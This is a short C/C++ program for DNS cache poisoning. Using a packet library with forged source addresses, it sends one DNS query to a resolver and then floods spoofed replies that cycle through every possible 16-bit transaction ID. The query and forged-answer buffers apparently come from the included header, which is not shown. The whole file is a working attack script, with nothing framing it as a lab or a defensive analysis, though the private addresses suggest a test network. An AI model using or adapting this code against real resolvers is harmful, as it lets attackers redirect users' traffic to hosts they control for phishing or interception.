#include "udp_pkt.h"
#include <unistd.h>

int main(void)
{
	UDPacket request(56432, 53, "10.10.0.1", "10.10.10.1");
	UDPacket reply  (53, 32145, "10.10.0.3", "10.10.10.1"); // Source Port - Destination Port - Source IP - Destination IP

	if( reply.error == 0 && request.error == 0){ // Check if no errors happen

		u_int16_t counter = 0;
		int error = 0;
		
		error = request.Send_Payload(question, sizeof(question)); usleep(10000); // Send to the DNS and wait a little, 10ms
		
		do{
			memcpy (answer, &counter, sizeof (u_int16_t)); // Build Custom Payload			
			error = reply.Send_Payload(answer, sizeof(answer)); // Send Custom Payload
			counter = counter + 0x0001;

		} while (counter != 0x0000 && error == 0); // For each Transaction ID

		printf("sent %d packets\n", counter);
		return error;
	}
	else{
		return 1;
	}
}
